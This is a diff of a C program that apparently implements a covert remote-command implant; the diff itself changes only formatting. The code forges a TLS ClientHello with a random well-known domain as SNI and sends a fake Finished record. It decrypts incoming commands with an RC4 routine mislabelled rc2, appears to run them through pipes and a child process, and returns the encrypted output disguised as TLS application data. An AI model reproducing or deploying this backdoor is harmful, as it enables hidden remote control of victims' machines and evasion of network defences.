@@ -5,8 +5,8 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
-#include <unistd.h>
 #include <time.h>
+#include <unistd.h>
 
 int end_tst() {
     volatile uint32_t i = 0x01234567;
@@ -22,8 +22,7 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
         "www.avira.com", "www.microsoft.com",
         "www.linkedin.com", "www.paypal.com",
         "www.uc.com", "www.yahoo.com",
-        "www.wikipedia.com", "www.wordpress.com"
-    };
+        "www.wikipedia.com", "www.wordpress.com"};
     srand(time(0));
     unsigned char* serv_name = pos_serv_names[rand() % 14];
     unsigned char serv_name_s = strlen(serv_name);
@@ -42,7 +41,7 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
     memcpy(ext_serv, ext_serv_pre, sizeof(ext_serv_pre));
     memcpy(ext_serv + sizeof(ext_serv_pre), serv_name, serv_name_s);
 
-    unsigned char ext_oth[103+32] = {0};
+    unsigned char ext_oth[103 + 32] = {0};
     unsigned char ext_oth_p1[] = {
         0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02, 0x00, 0x0a,
         0x00, 0x16, 0x00, 0x14, 0x00, 0x1d, 0x00, 0x17, 0x00, 0x1e,
@@ -64,7 +63,7 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
         ext_oth_p2[i] = rand();
     }
     memcpy(ext_oth, ext_oth_p1, 103);
-    memcpy(ext_oth+103, ext_oth_p2, 32);
+    memcpy(ext_oth + 103, ext_oth_p2, 32);
     free(ext_oth_p2);
 
     unsigned char ext_s = ext_serv_ss + sizeof(ext_oth);
@@ -84,14 +83,14 @@ void craft_cli_hel(unsigned char** cli_hel, int* cli_hel_s) {
     unsigned char cv_el_p1[] = {0x03, 0x03};
     unsigned char cv_el_p2[] = {0x20};
     unsigned char cv_el_p3[] = {0x00, 0x08, 0x13,
-        0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00,
-        ext_s};
-    unsigned char cv_el[2+32+1+32+14] = {};
+                                0x02, 0x13, 0x03, 0x13, 0x01, 0x00, 0xff, 0x01, 0x00, 0x00,
+                                ext_s};
+    unsigned char cv_el[2 + 32 + 1 + 32 + 14] = {};
     memcpy(cv_el, cv_el_p1, 2);
-    memcpy(cv_el+2, cv_el_r1, 32);
-    memcpy(cv_el+2+32, cv_el_p2, 1);
-    memcpy(cv_el+2+32+1, cv_el_r2, 32);
-    memcpy(cv_el+2+32+1+32, cv_el_p3, 14);
+    memcpy(cv_el + 2, cv_el_r1, 32);
+    memcpy(cv_el + 2 + 32, cv_el_p2, 1);
+    memcpy(cv_el + 2 + 32 + 1, cv_el_r2, 32);
+    memcpy(cv_el + 2 + 32 + 1 + 32, cv_el_p3, 14);
     free(cv_el_r1);
     free(cv_el_r2);
 
@@ -173,10 +172,10 @@ void cnsm_serv_hel_plus(int sock) {
 }
 
 void snd_cli_hel_fin(int sock) {
-    int cli_hel_fin_s = 11+69;
+    int cli_hel_fin_s = 11 + 69;
     unsigned char cli_hel_fin[cli_hel_fin_s];
     unsigned char cli_hel_fin_p1[] = {
-        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03, 
+        0x14, 0x03, 0x03, 0x00, 0x01, 0x01, 0x17, 0x03,
         0x03, 0x00, 0x45};
     unsigned char* cli_hel_fin_p2 = malloc(69);
     srand(time(0));
@@ -184,37 +183,37 @@ void snd_cli_hel_fin(int sock) {
         cli_hel_fin_p2[i] = rand();
     }
     memcpy(cli_hel_fin, cli_hel_fin_p1, 11);
-    memcpy(cli_hel_fin+11, cli_hel_fin_p2, 69);
+    memcpy(cli_hel_fin + 11, cli_hel_fin_p2, 69);
     free(cli_hel_fin_p2);
 
     send(sock, cli_hel_fin, cli_hel_fin_s, 0);
 }
 
-void swap(unsigned char *a, unsigned char *b) {
+void swap(unsigned char* a, unsigned char* b) {
     unsigned char tmp = *a;
     *a = *b;
     *b = tmp;
 }
 
-void KSA(unsigned char *key, unsigned char *S) {
+void KSA(unsigned char* key, unsigned char* S) {
     unsigned int len = strlen(key);
     unsigned int j = 0;
 
-    for(unsigned int i = 0; i < 256; i++)
+    for (unsigned int i = 0; i < 256; i++)
         S[i] = i;
 
-    for(unsigned int i = 0; i < 256; i++) {
+    for (unsigned int i = 0; i < 256; i++) {
         j = (j + S[i] + key[i % len]) % 256;
 
         swap(&S[i], &S[j]);
     }
 }
 
-void PRGA(unsigned char *S, unsigned char *plaintext, unsigned char *ciphertext, int len) {
+void PRGA(unsigned char* S, unsigned char* plaintext, unsigned char* ciphertext, int len) {
     int i = 0;
     int j = 0;
 
-    for(size_t n = 0; n < len; n++) {
+    for (size_t n = 0; n < len; n++) {
         i = (i + 1) % 256;
         j = (j + S[i]) % 256;
 
@@ -279,11 +278,11 @@ int main(int argc, char const* argv[]) {
             cmd_s = (buf_cmd[3] << 8) + buf_cmd[4];
         }
 
-        unsigned char* cmd_enc = malloc(cmd_s+1);
-        memcpy(cmd_enc, buf_cmd+5, cmd_s);
+        unsigned char* cmd_enc = malloc(cmd_s + 1);
+        memcpy(cmd_enc, buf_cmd + 5, cmd_s);
         cmd_enc[cmd_s] = '\0';
 
-        unsigned char *cmd = malloc(cmd_s+1);
+        unsigned char* cmd = malloc(cmd_s + 1);
         rc2(key, cmd_enc, cmd, cmd_s);
         cmd[cmd_s] = '\0';
 
@@ -310,16 +309,16 @@ int main(int argc, char const* argv[]) {
             buf_res_s = read(pipes[0], buf_res, sizeof(buf_res));
             wait(NULL);
         }
- 
+
         if (!buf_res_s) {
             buf_res_s = 13;
             strncpy(buf_res, "(No Return)\n", buf_res_s);
         }
 
-        unsigned char *ciphertext = malloc(buf_res_s);
+        unsigned char* ciphertext = malloc(buf_res_s);
         rc2(key, buf_res, ciphertext, buf_res_s);
 
-        unsigned char* fin_res = malloc(5+buf_res_s);
+        unsigned char* fin_res = malloc(5 + buf_res_s);
         fin_res[0] = 0x17;
         fin_res[1] = 0x03;
         fin_res[2] = 0x03;
